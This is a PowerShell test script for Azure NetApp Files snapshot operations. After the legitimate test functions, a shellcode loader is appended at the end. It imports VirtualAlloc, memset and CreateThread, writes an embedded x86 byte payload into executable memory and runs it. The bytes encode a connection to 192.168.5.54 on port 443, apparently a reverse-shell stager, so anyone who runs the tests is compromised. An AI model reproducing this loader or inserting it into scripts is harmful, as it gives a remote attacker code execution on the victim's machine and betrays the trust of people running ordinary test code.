














function Test-SnapshotCrud
{
    $currentSub = (Get-AzureRmContext).Subscription	
    $subsid = $currentSub.SubscriptionId

    $resourceGroup = Get-ResourceGroupName
    $accName = Get-ResourceName
    $poolName = Get-ResourceName
    $volName = Get-ResourceName
    $snName1 = Get-ResourceName
    $snName2 = Get-ResourceName
    $gibibyte = 1024 * 1024 * 1024
    $usageThreshold = 100 * $gibibyte
    $doubleUsage = 2 * $usageThreshold
    $resourceLocation = Get-ProviderLocation "Microsoft.NetApp"
    $subnetName = "default"
    $standardPoolSize = 4398046511104
    $serviceLevel = "Premium"
    $vnetName = $resourceGroup + "-vnet"

    $subnetId = "/subscriptions/$subsId/resourceGroups/$resourceGroup/providers/Microsoft.Network/virtualNetworks/$vnetName/subnets/$subnetName"

    try
    {
        
        New-AzResourceGroup -Name $resourceGroup -Location $resourceLocation
		
        
        $virtualNetwork = New-AzVirtualNetwork -ResourceGroupName $resourceGroup -Location $resourceLocation -Name $vnetName -AddressPrefix 10.0.0.0/16
        $delegation = New-AzDelegation -Name "netAppVolumes" -ServiceName "Microsoft.Netapp/volumes"
        Add-AzVirtualNetworkSubnetConfig -Name $subnetName -VirtualNetwork $virtualNetwork -AddressPrefix "10.0.1.0/24" -Delegation $delegation | Set-AzVirtualNetwork

        
        New-AzResourceGroup -Name $resourceGroupName -Location $resourceLocation

        
        $retrievedAcc = New-AzNetAppFilesAccount -ResourceGroupName $resourceGroup -Location $resourceLocation -AccountName $accName

        $retrievedPool = New-AzNetAppFilesPool -ResourceGroupName $resourceGroup -Location $resourceLocation -AccountName $accName -PoolName $poolName -PoolSize $standardPoolSize -ServiceLevel $serviceLevel
		
        $retrievedVolume = New-AzNetAppFilesVolume -ResourceGroupName $resourceGroup -Location $resourceLocation -AccountName $accName -PoolName $poolName -VolumeName $volName -CreationToken $volName -UsageThreshold $usageThreshold -ServiceLevel $serviceLevel -SubnetId $subnetId
        Assert-AreEqual "$accName/$poolName/$volName" $retrievedVolume.Name
        Assert-AreEqual $serviceLevel $retrievedVolume.ServiceLevel

        
        $retrieveSn = New-AzNetAppFilesSnapshot -ResourceGroupName $resourceGroup -Location $resourceLocation -AccountName $accName -PoolName $poolName -VolumeName $volName -SnapshotName $snName1 -FileSystemId $retrievedVolume.FileSystemId
        Assert-AreEqual "$accName/$poolName/$volName/$snName1" $retrieveSn.Name
        
        Assert-NotNull $retrieveSn.Created

        
        $retrieveSn = New-AzNetAppFilesSnapshot -ResourceGroupName $resourceGroup -Location $resourceLocation -AccountName $accName -PoolName $poolName -VolumeName $volName -SnapshotName $snName2
        Assert-AreEqual "$accName/$poolName/$volName/$snName2" $retrieveSn.Name

        
        $retrievedSnapshot = Get-AzNetAppFilesSnapshot -ResourceGroupName $resourceGroup -AccountName $accName -PoolName $poolName -VolumeName $volName
        Assert-AreEqual "$accName/$poolName/$volName/$snName1" $retrievedSnapshot[0].Name
        Assert-AreEqual "$accName/$poolName/$volName/$snName2" $retrievedSnapshot[1].Name
        Assert-AreEqual 2 $retrievedSnapshot.Length

        
        $retrievedSnapshot = Get-AzNetAppFilesSnapshot -ResourceGroupName $resourceGroup -AccountName $accName -PoolName $poolName -VolumeName $volName -SnapshotName $snName1
        Assert-AreEqual "$accName/$poolName/$volName/$snName1" $retrievedSnapshot.Name
		
        
        $retrievedSnapshotById = Get-AzNetAppFilesSnapshot -ResourceId $retrievedSnapshot.Id
        Assert-AreEqual "$accName/$poolName/$volName/$snName1" $retrievedSnapshotById.Name

        

        
        Remove-AzNetAppFilesSnapshot -ResourceId $retrievedSnapshotById.Id
        Remove-AzNetAppFilesSnapshot -ResourceGroupName $resourceGroup -AccountName $accName -PoolName $poolName -VolumeName $volName -SnapshotName $snName2
        $retrievedSnapshot = Get-AzNetAppFilesSnapshot -ResourceGroupName $resourceGroup -AccountName $accName -PoolName $poolName -VolumeName $volName
        Assert-AreEqual 0 $retrievedSnapshot.Length
    }
    finally
    {
        
        Clean-ResourceGroup $resourceGroup
    }
}


function Test-SnapshotPipelines
{
    $currentSub = (Get-AzureRmContext).Subscription	
    $subsid = $currentSub.SubscriptionId

    $resourceGroup = Get-ResourceGroupName
    $accName = Get-ResourceName
    $poolName = Get-ResourceName
    $volName = Get-ResourceName
    $snName1 = Get-ResourceName
    $snName2 = Get-ResourceName
    $gibibyte = 1024 * 1024 * 1024
    $usageThreshold = 100 * $gibibyte
    $doubleUsage = 2 * $usageThreshold
    $resourceLocation = Get-ProviderLocation "Microsoft.NetApp"
    $subnetName = "default"
    $poolSize = 4398046511104
    $serviceLevel = "Premium"
    $vnetName = $resourceGroup + "-vnet"

    $subnetId = "/subscriptions/$subsId/resourceGroups/$resourceGroup/providers/Microsoft.Network/virtualNetworks/$vnetName/subnets/$subnetName"

    try
    {
        
        New-AzResourceGroup -Name $resourceGroup -Location $resourceLocation
		
        
        $virtualNetwork = New-AzVirtualNetwork -ResourceGroupName $resourceGroup -Location $resourceLocation -Name $vnetName -AddressPrefix 10.0.0.0/16
        $delegation = New-AzDelegation -Name "netAppVolumes" -ServiceName "Microsoft.Netapp/volumes"
        Add-AzVirtualNetworkSubnetConfig -Name $subnetName -VirtualNetwork $virtualNetwork -AddressPrefix "10.0.1.0/24" -Delegation $delegation | Set-AzVirtualNetwork

        
        $retrievedAcc = New-AnfAccount -ResourceGroupName $resourceGroup -Location $resourceLocation -AccountName $accName 

        New-AnfPool -ResourceGroupName $resourceGroup -Location $resourceLocation -AccountName $accName -Name $poolName -PoolSize $poolSize -ServiceLevel $serviceLevel

        $retrievedVolume = New-AnfVolume -ResourceGroupName $resourceGroup -Location $resourceLocation -AccountName $accName -PoolName $poolName -VolumeName $volName -CreationToken $volName -UsageThreshold $usageThreshold -ServiceLevel $serviceLevel -SubnetId $subnetId
        
        
        $retrieveSn = Get-AnfVolume -ResourceGroupName $resourceGroup -AccountName $accName -PoolName $poolName -VolumeName $volName | New-AnfSnapshot -SnapshotName $snName1
        Assert-AreEqual "$accName/$poolName/$volName/$snName1" $retrieveSn.Name
        
        
        Get-AnfSnapshot -ResourceGroupName $resourceGroup -AccountName $accName -PoolName $poolName -VolumeName $volName -Name $snName1 | Remove-AnfSnapshot

        
        $retrievedSnapshot = Get-AnfVolume -ResourceGroupName $resourceGroup -AccountName $accName -PoolName $poolName -Name $volName | Get-AnfSnapshot 
        Assert-AreEqual 0 $retrievedSnapshot.Length
    }
    finally
    {
        
        Clean-ResourceGroup $resourceGroup
    }
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x05,0x36,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

